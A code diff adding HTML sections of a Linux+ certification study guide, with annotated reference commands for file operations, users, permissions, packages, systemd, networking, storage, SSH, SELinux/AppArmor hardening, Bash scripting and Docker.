+├── proc/           Virtual filesystem — kernel/process info
+│   ├── cpuinfo     CPU details
+│   ├── meminfo     Memory info
+│   ├── net/        Network statistics
+│   └── PID/        Per-process directory
+├── root/           Root user's home directory
+├── run/            Runtime data (PID files, sockets)
+├── srv/            Service data (web server files)
+├── sys/            Virtual filesystem — kernel/hardware info
+├── tmp/            Temporary files (cleared on reboot)
+├── usr/            User utilities and applications
+│   ├── bin/        Non-essential user binaries
+│   ├── sbin/       Non-essential system binaries
+│   ├── lib/        Libraries for /usr/bin and /usr/sbin
+│   ├── local/      Locally installed software
+│   └── share/      Shared data (man pages, docs)
+└── var/            Variable data (logs, mail, databases)
+    ├── log/        System log files
+    ├── www/        Web server files
+    ├── spool/      Print spooler, mail queue
+    └── tmp/        Temp files preserved across reboots
+</code></pre>
+`,
+  "study-guide-linuxplus-03": `
+<h2>3. Command Line Essentials</h2>
+<h3>Navigation and File Operations</h3>
+<pre><code># Navigation
+pwd                             # Print working directory
+cd /etc                         # Change to absolute path
+cd ~                            # Go to home directory
+cd -                            # Go to previous directory
+cd ..                           # Go up one level
+
+# Listing
+ls                              # List files
+ls -l                           # Long format (permissions, owner, size, date)
+ls -a                           # Show hidden files (starting with .)
+ls -la                          # Both
+ls -lh                          # Human-readable sizes
+ls -lt                          # Sort by modification time
+ls -lS                          # Sort by size (largest first)
+ls -R                           # Recursive
+ls -d */                        # List directories only
+
+# File operations
+cp file.txt backup.txt          # Copy
+cp -r dir/ backup/              # Copy directory recursively
+mv file.txt /tmp/               # Move (also renames)
+mv old.txt new.txt              # Rename
+rm file.txt                     # Delete file
+rm -rf directory/               # Delete directory recursively (DANGEROUS)
+rm -i file.txt                  # Interactive — ask before delete
+touch file.txt                  # Create empty file or update timestamp
+mkdir directory                 # Create directory
+mkdir -p /path/to/nested/dir    # Create nested dirs
+rmdir directory                 # Remove empty directory
+ln -s /target /link             # Create symbolic link
+ln /target /link                # Create hard link
+
+# File viewing
+cat file.txt                    # Display entire file
+less file.txt                   # Page through (q to quit, / to search)
+more file.txt                   # Like less but less capable
+head -n 20 file.txt             # First 20 lines
+tail -n 20 file.txt             # Last 20 lines
+tail -f /var/log/syslog         # Follow (live updates)
+wc -l file.txt                  # Count lines
+wc -w file.txt                  # Count words
+wc -c file.txt                  # Count bytes
+
+# Searching
+find / -name "file.txt"         # Find by name
+find / -type f -name "*.log"    # Find files with .log extension
+find / -type d -name "config"   # Find directories
+find / -size +100M              # Files larger than 100MB
+find / -mtime -7                # Modified in last 7 days
+find / -user alice              # Owned by alice
+find / -perm -4000              # Files with SUID bit
+find . -name "*.txt" -exec rm {} \\;  # Execute command on results
+
+grep "pattern" file.txt         # Search for pattern in file
+grep -i "pattern" file.txt      # Case-insensitive
+grep -r "pattern" /etc/         # Recursive search
+grep -n "pattern" file.txt      # Show line numbers
+grep -v "pattern" file.txt      # Invert (lines NOT matching)
+grep -E "pattern1|pattern2"     # Extended regex (egrep)
+grep -c "pattern" file.txt      # Count matching lines
+grep -l "pattern" *.txt         # List files that match
+
+locate filename                 # Fast search using database
+updatedb                        # Update locate database
+which command                   # Find command's location
+whereis command                 # Find binary, source, man page
+type command                    # What kind of thing is command
+</code></pre>
+<h3>Text Processing</h3>
+<pre><code># Sort
+sort file.txt                   # Sort alphabetically
+sort -n file.txt                # Numeric sort
+sort -r file.txt                # Reverse sort
+sort -u file.txt                # Unique (remove duplicates)
+sort -k 2 file.txt              # Sort by 2nd field
+sort -t: -k3 -n /etc/passwd     # Sort passwd by UID
+
+# Cut and columns
+cut -d: -f1 /etc/passwd         # Get usernames (field 1, delimiter :)
+cut -c1-5 file.txt              # Characters 1-5
+awk -F: '{print $1,$3}' /etc/passwd  # Print field 1 and 3
+awk '{sum+=$1} END{print sum}' file  # Sum column
+
+# sed (stream editor)
+sed 's/old/new/' file.txt       # Replace first occurrence per line
+sed 's/old/new/g' file.txt      # Replace all occurrences
+sed 's/old/new/g' -i file.txt   # Edit file in-place
+sed -n '5,10p' file.txt         # Print lines 5-10
+sed '3d' file.txt               # Delete line 3
+sed '/pattern/d' file.txt       # Delete lines matching pattern
+
+# Other text utilities
+tr 'a-z' 'A-Z' &lt; file.txt      # Translate (lowercase to uppercase)
+tr -d '\\r' &lt; file.txt           # Delete carriage returns
+uniq file.txt                   # Remove consecutive duplicates
+uniq -c file.txt                # Count duplicates
+diff file1.txt file2.txt        # Compare files
+comm file1.txt file2.txt        # Lines common/unique to files
+paste file1.txt file2.txt       # Merge lines side by side
+join file1.txt file2.txt        # Join on common field
+tee output.txt                  # Write to file AND stdout
+xargs                           # Build command from stdin
+</code></pre>
+<h3>Pipes and Redirection</h3>
+<pre><code># Redirection
+command &gt; output.txt            # Redirect stdout (overwrite)
+command &gt;&gt; output.txt           # Append stdout
+command 2&gt; error.txt            # Redirect stderr
+command 2&gt;&amp;1                    # Redirect stderr to stdout
+command &amp;&gt; all.txt              # Redirect both stdout and stderr
+command &gt; /dev/null 2&gt;&amp;1        # Discard all output
+command &lt; input.txt             # Redirect stdin from file
+
+# Pipes
+command1 | command2             # Pipe stdout to stdin
+ls -la | grep ".txt"            # List .txt files
+cat /etc/passwd | cut -d: -f1 | sort    # Pipeline
+ps aux | grep nginx | grep -v grep
+
+# File descriptors
+# 0 = stdin, 1 = stdout, 2 = stderr
+
+# Here document
+cat &lt;&lt; EOF &gt; file.txt
+Line 1
+Line 2
+EOF
+
+# Process substitution
+diff &lt;(sort file1.txt) &lt;(sort file2.txt)
+</code></pre>
+
+`,
+  "study-guide-linuxplus-04": `
+<h2>4. User and Group Management</h2>
+<pre><code># User management
+useradd alice                   # Create user (minimal setup)
+useradd -m -s /bin/bash -c "Alice Smith" -G sudo alice   # Full creation
+useradd -u 1500 alice           # Set specific UID
+userdel alice                   # Delete user (keep home)
+userdel -r alice                # Delete user and home directory
+usermod -aG sudo alice          # Add to group (keep existing groups)
+usermod -G wheel alice          # Set groups (REPLACES existing)
+usermod -s /bin/zsh alice       # Change shell
+usermod -l newname alice        # Rename user
+usermod -L alice                # Lock account
+usermod -U alice                # Unlock account
+usermod -e 2024-12-31 alice     # Set expiry date
+usermod -d /home/newdir alice   # Change home directory
+
+# Password management
+passwd alice                    # Set/change password
+passwd -l alice                 # Lock account
+passwd -u alice                 # Unlock account
+passwd -e alice                 # Force change on next login
+chage -l alice                  # List password aging info
+chage -M 90 alice               # Set max password age (90 days)
+chage -m 7 alice                # Minimum days between changes
+chage -E 2024-12-31 alice       # Set expiry date
+chage -W 14 alice               # Warning 14 days before expiry
+
+# Group management
+groupadd developers             # Create group
+groupdel developers             # Delete group
+groupmod -n devteam developers  # Rename group
+groups alice                    # Show alice's groups
+id alice                        # UID, GID, all groups
+newgrp developers               # Switch primary group (current session)
+
+# Important files
+/etc/passwd     # Username:x:UID:GID:GECOS:home:shell
+/etc/shadow     # Username:hash:last_change:min:max:warn:inactive:expire
+/etc/group      # Groupname:x:GID:member1,member2
+/etc/gshadow    # Secure group file
+/etc/default/useradd  # Default useradd settings
+/etc/login.defs # Password aging and account defaults
+/etc/skel/      # Template files copied to new home directories
+
+# Switching users
+su - alice                      # Switch to alice (full login shell)
+su alice                        # Switch (no new environment)
+sudo command                    # Run command as root
+sudo -u alice command           # Run as alice
+sudo -i                         # Root shell
+sudo -s                         # Root shell (keep environment)
+sudo -l                         # List sudo permissions
+
+# sudoers file
+visudo                          # Edit sudoers (validates syntax)
+# Format: user/group host=(runas) commands
+alice  ALL=(ALL:ALL) ALL        # Full sudo access
+%wheel ALL=(ALL) NOPASSWD: ALL  # Group wheel, no password
+alice  ALL=(ALL) /bin/systemctl restart nginx   # Specific command
+</code></pre>
+
+`,
+  "study-guide-linuxplus-05": `
+<h2>5. Permissions</h2>
+<h3>Standard Unix Permissions</h3>
+<pre><code># View permissions
+ls -l
+# -rwxr-xr-- 1 alice devs 4096 Jan 15 10:30 script.sh
+#  ^^^^^^^^^^   ^^^^^ ^^^^
+#  permissions  user  group
+
+# Permission bits
+# r = read    (4)
+# w = write   (2)
+# x = execute (1)
+# - = none    (0)
+
+# Three groups: owner | group | others
+# rwxr-xr-- = 7(owner) 5(group) 4(others) = 754
+
+# Change permissions
+chmod 755 script.sh             # Numeric (rwxr-xr-x)
+chmod 644 file.txt              # Numeric (rw-r--r--)
+chmod u+x script.sh             # Add execute to owner
+chmod g-w file.txt              # Remove write from group
+chmod o=r file.txt              # Set others to read only
+chmod a+r file.txt              # Add read to all
+chmod u=rwx,g=rx,o= file.sh    # Set exactly
+
+# Recursive
+chmod -R 755 directory/
+chmod -R u+rwX directory/       # Capital X = execute only on dirs
+
+# Change owner and group
+chown alice file.txt
+chown alice:devs file.txt
+chown :devs file.txt            # Change group only
+chgrp devs file.txt             # Change group
+chown -R alice:devs directory/  # Recursive
+
+# Common permission sets
+# 777 rwxrwxrwx — avoid! (unsafe)
+# 755 rwxr-xr-x — executable/directory
+# 644 rw-r--r-- — regular file
+# 600 rw------- — private file
+# 700 rwx------ — private executable/directory
+</code></pre>
+<h3>Special Permission Bits</h3>
+<pre><code># SUID (Set User ID) — bit 4
+# File executes with owner's permissions, not caller's
+chmod u+s /usr/bin/passwd       # passwd needs root to write /etc/shadow
+chmod 4755 program              # 4 = SUID
+ls -l /usr/bin/passwd           # Shows: -rwsr-xr-x (s in owner execute)
+find / -perm -4000 -type f      # Find SUID files
+
+# SGID (Set Group ID) — bit 2
+# File executes with group's permissions
+# On directory: new files inherit directory's group
+chmod g+s directory/
+chmod 2755 directory/
+ls -l directory/                # Shows: drwxr-sr-x (s in group execute)
+
+# Sticky bit — bit 1
+# On directory: only owner can delete their own files
+chmod +t /tmp
+chmod 1777 /tmp
+ls -l /                         # Shows: drwxrwxrwt for /tmp (t in others)
+
+# Numeric special bits: SUID=4, SGID=2, Sticky=1
+chmod 4755 file     # SUID
+chmod 2755 dir      # SGID
+chmod 1777 dir      # Sticky
+chmod 6755 file     # SUID + SGID
+</code></pre>
+<h3>File Attributes</h3>
+<pre><code>chattr +i file.txt              # Immutable (even root can't delete)
+chattr +a file.txt              # Append-only
+chattr -i file.txt              # Remove immutable
+lsattr file.txt                 # List attributes
+</code></pre>
+<h3>Access Control Lists (ACL)</h3>
+<pre><code>getfacl file.txt                # View ACL
+setfacl -m u:alice:rw file.txt  # Give alice read-write
+setfacl -m g:devs:r file.txt    # Give devs group read
+setfacl -x u:alice file.txt     # Remove ACL for alice
+setfacl -b file.txt             # Remove all ACLs
+setfacl -m d:u:alice:rw dir/    # Default ACL for new files in dir
+</code></pre>
+
+`,
+  "study-guide-linuxplus-06": `
+<h2>6. Package Management</h2>
+<h3>Red Hat / RHEL / Fedora (RPM)</h3>
+<pre><code># DNF (modern, Fedora/RHEL 8+)
+dnf install nginx               # Install
+dnf remove nginx                # Remove
+dnf update                      # Update all packages
+dnf upgrade nginx               # Upgrade specific package
+dnf search nginx                # Search
+dnf info nginx                  # Package info
+dnf list installed              # List installed
+dnf list available              # List available
+dnf check-update                # Check for updates
+dnf repolist                    # List repositories
+dnf history                     # Transaction history
+dnf autoremove                  # Remove unused dependencies
+dnf clean all                   # Clean cache
+
+# YUM (older, RHEL 7)
+yum install nginx
+yum remove nginx
+yum update
+yum search nginx
+
+# RPM (low-level)
+rpm -ivh package.rpm            # Install with verbose + hash
+rpm -Uvh package.rpm            # Upgrade
+rpm -evh package                # Erase (uninstall)
+rpm -qa                         # Query all installed
+rpm -qi nginx                   # Query info
+rpm -ql nginx                   # List files in package
+rpm -qf /etc/nginx/nginx.conf   # Find which package owns file
+rpm -qR nginx                   # List dependencies
+rpm --verify nginx               # Verify package integrity
+rpm -K package.rpm              # Check signature
+</code></pre>
+<h3>Debian / Ubuntu (APT)</h3>
+<pre><code># APT (high-level)
+apt update                      # Update package list
+apt upgrade                     # Upgrade all packages
+apt install nginx               # Install
+apt remove nginx                # Remove (keep config)
+apt purge nginx                 # Remove + config files
+apt autoremove                  # Remove unused dependencies
+apt search nginx                # Search
+apt show nginx                  # Package info
+apt list --installed            # List installed
+apt list --upgradable           # List upgradable
+
+# DPKG (low-level)
+dpkg -i package.deb             # Install
+dpkg -r nginx                   # Remove
+dpkg -P nginx                   # Purge
+dpkg -l                         # List all installed
+dpkg -l nginx                   # Info about nginx
+dpkg -L nginx                   # List files installed by nginx
+dpkg -S /etc/nginx/nginx.conf   # Find package owning file
+dpkg -c package.deb             # Contents of .deb file
+dpkg --verify nginx             # Verify
+
+# Add repository
+add-apt-repository ppa:user/repo
+# Manual repo:
+echo "deb http://repo.example.com/debian stable main" &gt; /etc/apt/sources.list.d/example.list
+apt-key add key.gpg
+</code></pre>
+
+`,
+  "study-guide-linuxplus-07": `
+<h2>7. Process Management</h2>
+<pre><code># View processes
+ps                              # Current shell's processes
+ps aux                          # All processes, all users
+ps aux | grep nginx
+ps -ef                          # Full format
+ps -ejH                         # Process tree
+pstree                          # Tree view
+
+# top and htop
+top                             # Interactive process viewer
+# Keys in top: k (kill), r (renice), q (quit), M (sort by memory)
+htop                            # Enhanced top (install separately)
+
+# Process signals
+kill PID                        # Send SIGTERM (graceful)
+kill -9 PID                     # Send SIGKILL (force)
+kill -15 PID                    # Send SIGTERM explicitly
+kill -HUP PID                   # SIGHUP — reload config
+killall nginx                   # Kill all nginx processes by name
+pkill nginx                     # Kill by name pattern
+pkill -u alice                  # Kill all processes by user
+
+# Common signals
+# 1  SIGHUP  — Hangup / reload config
+# 2  SIGINT  — Interrupt (Ctrl+C)
+# 9  SIGKILL — Kill immediately (cannot be caught)
+# 15 SIGTERM — Terminate gracefully (default for kill)
+# 18 SIGCONT — Continue
+# 19 SIGSTOP — Stop (cannot be caught)
+
+# Background and foreground
+command &amp;                       # Run in background
+Ctrl+Z                          # Suspend current process
+jobs                            # List background/suspended jobs
+bg                              # Resume suspended in background
+fg                              # Bring background to foreground
+fg %2                           # Bring job 2 to foreground
+disown %1                       # Remove from shell's job list (survive logout)
+nohup command &amp;                 # Run even after logout (output to nohup.out)
+
+# Priority
+nice -n 10 command              # Start with lower priority (10, range -20 to 19)
+nice -n -10 command             # Higher priority (needs root)
+renice 10 -p PID                # Change priority of running process
+
+# Viewing resource usage
+top                             # Real-time
+free -h                         # Memory usage
+vmstat 1                        # Virtual memory stats every 1 second
+iostat 1                        # I/O statistics
+lsof                            # List open files
+lsof -p PID                     # Open files for specific process
+lsof -u alice                   # Open files for user
+lsof -i :80                     # Processes using port 80
+</code></pre>
+
+`,
+  "study-guide-linuxplus-08": `
+<h2>8. Systemd and Services</h2>
+<pre><code># Service management
+systemctl start nginx           # Start service
+systemctl stop nginx            # Stop service
+systemctl restart nginx         # Restart
+systemctl reload nginx          # Reload config (no downtime)
+systemctl enable nginx          # Enable at boot
+systemctl disable nginx         # Disable at boot
+systemctl enable --now nginx    # Enable AND start immediately
+systemctl status nginx          # Check status
+systemctl is-active nginx       # Is it running?
+systemctl is-enabled nginx      # Is it enabled at boot?
+
+# System control
+systemctl list-units            # List active units
+systemctl list-units --type=service
+systemctl list-unit-files       # All installed unit files
+systemctl daemon-reload         # Reload systemd after unit file change
+systemctl reboot
+systemctl poweroff
+systemctl halt
+
+# Journal (logs)
+journalctl                      # All logs
+journalctl -u nginx             # Logs for nginx service
+journalctl -f                   # Follow (like tail -f)
+journalctl -n 50                # Last 50 lines
+journalctl --since "1 hour ago"
+journalctl --since "2024-01-15 10:00:00"
+journalctl -b                   # Current boot
+journalctl -b -1                # Previous boot
+journalctl -p err               # Only error and above
+journalctl -p err..crit         # Range of priorities
+
+# Creating a systemd service unit
+# /etc/systemd/system/myapp.service
+cat &lt;&lt; 'EOF' &gt; /etc/systemd/system/myapp.service
+[Unit]
+Description=My Application
+After=network.target
+
+[Service]
+Type=simple
+User=appuser
+WorkingDirectory=/opt/myapp
+ExecStart=/opt/myapp/start.sh
+ExecStop=/opt/myapp/stop.sh
+Restart=on-failure
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload
+systemctl enable --now myapp
+</code></pre>
+
+`,
+  "study-guide-linuxplus-09": `
+<h2>9. Networking</h2>
+<pre><code># View network configuration
+ip addr show                    # All interfaces and IPs
+ip addr show eth0               # Specific interface
+ip link show                    # Link-layer info
+ip route show                   # Routing table
+ip neigh show                   # ARP/neighbor table
+ss -tulnp                       # Listening ports and processes
+ss -an                          # All connections
+netstat -tulnp                  # Older alternative
+netstat -an
+
+# Configure network (temporary)
+ip addr add 192.168.1.100/24 dev eth0
+ip addr del 192.168.1.100/24 dev eth0
+ip link set eth0 up
+ip link set eth0 down
+ip route add default via 192.168.1.1
+ip route add 10.0.0.0/8 via 192.168.1.254
+
+# Persistent network config
+# Ubuntu/Netplan (/etc/netplan/*.yaml)
+# RHEL (/etc/sysconfig/network-scripts/ifcfg-eth0)
+# Systemd-networkd (/etc/systemd/network/*.network)
+
+# DNS
+cat /etc/resolv.conf            # DNS servers
+cat /etc/hosts                  # Static hostname resolution
+resolvectl status               # systemd-resolved info
+dig example.com                 # DNS query
+dig example.com MX
+dig +short example.com
+nslookup example.com
+host example.com
+
+# Network testing
+ping -c 4 8.8.8.8               # ICMP echo (4 packets)
+ping6 ::1                       # IPv6 ping
+traceroute example.com          # Trace path
+tracepath example.com           # No root required
+mtr example.com                 # Interactive traceroute
+curl -v http://example.com      # HTTP request
+wget http://example.com/file
+nc -zv 10.0.0.1 22              # Test TCP port
+nc -zvu 10.0.0.1 53             # Test UDP port
+tcpdump -i eth0                 # Capture packets
+tcpdump -i eth0 port 80
+tcpdump -w capture.pcap
+
+# Firewall
+# iptables
+iptables -L                     # List all rules
+iptables -L -n -v               # With numbers and packet counts
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -j DROP       # Default deny
+iptables -D INPUT 3             # Delete rule 3
+iptables -I INPUT 1 -j ACCEPT  # Insert at position 1
+iptables -F                     # Flush (delete all rules)
+iptables-save &gt; rules.v4        # Save rules
+iptables-restore &lt; rules.v4    # Restore rules
+
+# nftables (modern replacement)
+nft list ruleset
+nft add rule inet filter input tcp dport 22 accept
+
+# firewalld (RHEL/Fedora)
+firewall-cmd --state
+firewall-cmd --list-all
+firewall-cmd --add-service=http --permanent
+firewall-cmd --add-port=8080/tcp --permanent
+firewall-cmd --reload
+firewall-cmd --zone=public --add-service=https
+
+# ufw (Ubuntu Uncomplicated Firewall)
+ufw status
+ufw enable
+ufw allow ssh
+ufw allow 80/tcp
+ufw deny 23
+ufw delete allow 80/tcp
+</code></pre>
+
+`,
+  "study-guide-linuxplus-10": `
+<h2>10. Storage and File Systems</h2>
+<pre><code># View storage
+df -h                           # Disk usage by filesystem
+du -sh /home/*                  # Directory sizes
+du -sh /var/log
+lsblk                           # Block devices tree
+blkid                           # UUIDs and types
+fdisk -l                        # List partitions (legacy MBR)
+gdisk -l /dev/sda               # List partitions (GPT)
+parted -l                       # parted's view
+
+# Partitioning
+fdisk /dev/sdb                  # Interactive MBR partitioning
+gdisk /dev/sdb                  # Interactive GPT partitioning
+parted /dev/sdb                 # GNU parted
+
+# Create filesystem
+mkfs.ext4 /dev/sdb1             # Format as ext4
+mkfs.xfs /dev/sdb1              # Format as XFS
+mkfs.vfat /dev/sdb1             # Format as FAT32
+mkswap /dev/sdb2                # Create swap
+
+# Mount/unmount
+mount /dev/sdb1 /mnt/data       # Mount device
+mount -t ext4 /dev/sdb1 /mnt   # Specify filesystem type
+mount -o ro /dev/sdb1 /mnt      # Read-only mount
+mount -o remount,rw /mnt        # Remount as read-write
+umount /mnt                     # Unmount
+umount -l /mnt                  # Lazy unmount
+findmnt                         # Show mount tree
+
+# /etc/fstab (persistent mounts)
+# Device   Mountpoint  FStype   Options          Dump  Pass
+UUID=xxx   /mnt/data   ext4    defaults          0     2
+/dev/sdb1  /mnt/data   xfs     defaults          0     0
+tmpfs      /tmp        tmpfs   defaults,size=1G  0     0
+
+mount -a                        # Mount everything in fstab
+
+# LVM (Logical Volume Manager)
+# Physical volumes → Volume group → Logical volumes
+
+# Create PV, VG, LV
+pvcreate /dev/sdb /dev/sdc      # Initialize physical volumes
+vgcreate myvg /dev/sdb /dev/sdc # Create volume group
+lvcreate -L 10G -n mylv myvg   # Create 10GB logical volume
+lvcreate -l 100%FREE -n mylv myvg  # Use all free space
+mkfs.ext4 /dev/myvg/mylv       # Format
+
+# Resize LVM
+lvextend -L +5G /dev/myvg/mylv  # Extend by 5GB
+lvextend -l +100%FREE /dev/myvg/mylv  # Use all free space
+resize2fs /dev/myvg/mylv        # Resize ext4 filesystem
+xfs_growfs /mnt/mountpoint      # Resize XFS filesystem
+
+# LVM info
+pvdisplay                       # Physical volume info
+vgdisplay                       # Volume group info
+lvdisplay                       # Logical volume info
+pvs; vgs; lvs                  # Quick summary
+
+# Snapshots
+lvcreate -L 1G -s -n snap /dev/myvg/mylv  # Create snapshot
+
+# RAID with mdadm
+mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sdb /dev/sdc
+mdadm --detail /dev/md0
+cat /proc/mdstat
+</code></pre>
+
+`,
+  "study-guide-linuxplus-11": `
+<h2>11. SSH and Remote Access</h2>
+<pre><code># Connect
+ssh alice@server.example.com
+ssh -p 2222 alice@server.example.com   # Non-default port
+ssh -i ~/.ssh/mykey alice@server.example.com  # Specific key
+ssh -X alice@server.example.com        # X11 forwarding (GUI apps)
+ssh -L 8080:localhost:80 alice@server  # Local port forwarding
+ssh -R 9090:localhost:3000 alice@server # Remote port forwarding
+
+# Key management
+ssh-keygen -t ed25519 -C "alice@example.com"   # Generate key pair
+ssh-keygen -t rsa -b 4096                       # RSA 4096-bit
+ssh-copy-id alice@server                        # Copy public key to server
+cat ~/.ssh/id_ed25519.pub &gt;&gt; ~/.ssh/authorized_keys  # Manual
+
+# SSH config file (~/.ssh/config)
+Host myserver
+    HostName server.example.com
+    User alice
+    Port 2222
+    IdentityFile ~/.ssh/mykey
+    ServerAliveInterval 60
+
+ssh myserver                    # Now just use alias
+
+# Server config (/etc/ssh/sshd_config)
+Port 22
+PermitRootLogin no              # Disable root SSH
+PasswordAuthentication no       # Keys only
+PubkeyAuthentication yes
+AllowUsers alice bob            # Whitelist users
+MaxAuthTries 3
+ClientAliveInterval 300
+Banner /etc/ssh/banner
+
+systemctl restart sshd          # Apply config changes
+
+# SCP and SFTP
+scp file.txt alice@server:/home/alice/
+scp alice@server:/file.txt ./
+scp -r directory/ alice@server:/tmp/
+sftp alice@server
+
+# Tunneling
+ssh -D 1080 alice@server        # Dynamic SOCKS proxy
+ssh -N -L 5432:dbserver:5432 alice@jumphost  # Tunnel DB port
+</code></pre>
+
+`,
+  "study-guide-linuxplus-12": `
+<h2>12. Security Hardening</h2>
+<pre><code># SELinux (Security-Enhanced Linux) — RHEL/CentOS
+getenforce                      # Enforcing / Permissive / Disabled
+setenforce 0                    # Set Permissive (temporary)
+setenforce 1                    # Set Enforcing (temporary)
+# Permanent: SELINUX=enforcing in /etc/selinux/config
+
+sestatus                        # Full SELinux status
+ls -Z file.txt                  # View SELinux context
+ps auxZ | grep nginx            # Process context
+chcon -t httpd_sys_content_t /var/www/html  # Change context
+restorecon -Rv /var/www/html    # Restore default context
+semanage fcontext -a -t httpd_sys_content_t '/data/web(/.*)?' # Permanent
+semanage port -l | grep http    # See allowed ports for HTTP
+semanage port -a -t http_port_t -p tcp 8080  # Allow port 8080
+getsebool -a | grep httpd       # SELinux booleans
+setsebool -P httpd_can_network_connect on  # Set boolean permanently
+ausearch -c nginx               # Search audit log for nginx
+
+# AppArmor (Ubuntu/Debian alternative to SELinux)
+aa-status                       # AppArmor status
+aa-enforce /etc/apparmor.d/usr.sbin.nginx   # Enforce profile
+aa-complain /etc/apparmor.d/usr.sbin.nginx  # Complain mode
+aa-disable /etc/apparmor.d/usr.sbin.nginx   # Disable profile
+apparmor_parser -r /etc/apparmor.d/nginx    # Reload profile
+
+# Auditd — Linux Audit System
+auditctl -l                     # List rules
+auditctl -w /etc/passwd -p wa   # Watch file for writes/attribs
+auditctl -a always,exit -F arch=b64 -S execve  # Log all exec calls
+ausearch -f /etc/passwd         # Search audit log for file
+ausearch -ua alice              # All audit events for alice
+ausearch -ts today              # Today's events
+aureport --failed               # Failed events report
+
+# Fail2Ban — block IPs after repeated failures
+systemctl status fail2ban
+fail2ban-client status          # List jails
+fail2ban-client status sshd     # SSH jail status
+fail2ban-client set sshd banip 1.2.3.4  # Manually ban IP
+fail2ban-client set sshd unbanip 1.2.3.4  # Unban IP
+
+# Security scanning
+lynis audit system              # System security audit
+rkhunter --check                # Rootkit hunter
+chkrootkit                      # Another rootkit checker
+aide --check                    # File integrity check
+aide --init                     # Initialize AIDE database
+</code></pre>
+
+`,
+  "study-guide-linuxplus-13": `
+<h2>13. Bash Scripting</h2>
+<pre><code>#!/bin/bash
+# Shebang line — tells system which interpreter to use
+
+# Variables
+NAME="Alice"
+AGE=25
+echo "Hello, $NAME! You are $AGE years old."
+
+# Command substitution
+DATE=$(date +%Y-%m-%d)
+UPTIME=\`uptime -p\`             # Old syntax
+
+# Arithmetic
+RESULT=$((5 + 3 * 2))
+let "COUNT += 1"
+COUNT=$((COUNT + 1))
+
+# Read input
+read -p "Enter your name: " USERNAME
+read -sp "Enter password: " PASSWORD    # Silent (for passwords)
+
+# Conditionals
+if [ "$NAME" = "Alice" ]; then
+    echo "Welcome, Alice!"
+elif [ "$AGE" -gt 18 ]; then
+    echo "You are an adult"
+else
+    echo "Hello, stranger"
+fi
+
+# Test operators
+# String: = != &lt; &gt; -z (empty) -n (non-empty)
+# Numeric: -eq -ne -lt -le -gt -ge
+# Files: -f (file) -d (dir) -e (exists) -r (readable) -w (writable) -x (executable) -s (non-empty)
+
+# [[ ]] (bash extended — preferred)
+if [[ "$NAME" == "Alice" &amp;&amp; "$AGE" -gt 18 ]]; then
+    echo "Adult Alice"
+fi
+if [[ "$NAME" =~ ^A ]]; then   # Regex match
+    echo "Name starts with A"
+fi
+
+# Case statement
+case "$1" in
+    start)   echo "Starting..." ;;
+    stop)    echo "Stopping..." ;;
+    restart) echo "Restarting..." ;;
+    *)       echo "Usage: $0 {start|stop|restart}" ;;
+esac
+
+# Loops
+for i in 1 2 3 4 5; do
+    echo "Number: $i"
+done
+
+for i in $(seq 1 10); do echo $i; done
+for i in {1..10}; do echo $i; done
+for i in {0..20..2}; do echo $i; done  # Step by 2
+
+for file in /etc/*.conf; do
+    echo "Config: $file"
+done
+
+while [ $COUNT -lt 10 ]; do
+    COUNT=$((COUNT + 1))
+done
+
+until [ $COUNT -ge 10 ]; do
+    COUNT=$((COUNT + 1))
+done
+
+# Functions
+function greet() {
+    local NAME="$1"             # Local variable
+    echo "Hello, $NAME!"
+    return 0                    # Return code (0=success)
+}
+greet "Alice"
+echo "Exit code: $?"
+
+# Arrays
+FRUITS=("apple" "banana" "cherry")
+echo "\${FRUITS[0]}"             # apple
+echo "\${FRUITS[@]}"             # All elements
+echo "\${#FRUITS[@]}"            # Count
+FRUITS+=("date")                # Append
+for fruit in "\${FRUITS[@]}"; do
+    echo "$fruit"
+done
+
+# Associative arrays (bash 4+)
+declare -A AGES
+AGES["alice"]=25
+AGES["bob"]=30
+echo "\${AGES["alice"]}"
+for key in "\${!AGES[@]}"; do
+    echo "$key: \${AGES[$key]}"
+done
+
+# Special variables
+$0      # Script name
+$1-$9   # Positional arguments
+$#      # Number of arguments
+$@      # All arguments (as separate words)
+$*      # All arguments (as one string)
+$$      # Current PID
+$!      # Last background PID
+$?      # Last exit code
+
+# Error handling
+set -e                          # Exit on error
+set -u                          # Exit on undefined variable
+set -o pipefail                 # Catch pipe failures
+set -x                          # Debug mode (print commands)
+set -euo pipefail               # Best practice combination
+
+trap 'echo "Error on line $LINENO"' ERR
+trap 'cleanup' EXIT             # Always run cleanup on exit
+
+# String operations
+STR="Hello, World!"
+echo "\${#STR}"                  # Length: 13
+echo "\${STR:7:5}"               # Substring: World
+echo "\${STR,,}"                 # Lowercase
+echo "\${STR^^}"                 # Uppercase
+echo "\${STR/World/Linux}"       # Replace first
+echo "\${STR//l/L}"              # Replace all
+echo "\${STR#Hello, }"           # Remove prefix
+echo "\${STR%!}"                 # Remove suffix
+FILE="/path/to/script.sh"
+echo "\${FILE##*/}"              # Basename: script.sh
+echo "\${FILE%/*}"               # Dirname: /path/to
+echo "\${FILE%.sh}"              # Remove extension: /path/to/script
+</code></pre>
+
+`,
+  "study-guide-linuxplus-14": `
+<h2>14. Containers and Automation</h2>
+<h3>Docker Basics</h3>
+<pre><code># Images
+docker pull ubuntu:22.04        # Pull from registry
+docker images                   # List local images
+docker rmi ubuntu:22.04         # Remove image
+docker build -t myapp:1.0 .     # Build from Dockerfile
+
+# Containers
+docker run ubuntu:22.04         # Run (exit immediately)
+docker run -it ubuntu:22.04 bash  # Interactive terminal
+docker run -d nginx             # Detached (background)
+docker run -d -p 8080:80 nginx  # Port mapping host:container
+docker run -d -v /data:/data nginx  # Volume mount
+docker run --name mycontainer nginx  # Named container
+docker run --env KEY=value nginx    # Environment variable
+docker run --rm nginx           # Remove on exit
+
+docker ps                       # Running containers
+docker ps -a                    # All containers (including stopped)
+docker start container_name
+docker stop container_name
+docker restart container_name
+docker rm container_name        # Remove stopped container
+docker rm -f container_name     # Force remove running container
+
+docker exec -it mycontainer bash    # Shell in running container
+docker logs mycontainer             # View logs
+docker logs -f mycontainer          # Follow logs
+docker inspect mycontainer          # Detailed info
+docker stats                        # Real-time resource usage
+docker cp file.txt container:/tmp/  # Copy to container
+
+# Dockerfile
+# FROM ubuntu:22.04
+# LABEL maintainer="alice@example.com"
+# ENV APP_PORT=8080
+# RUN apt-get update &amp;&amp; apt-get install -y python3
+# WORKDIR /app
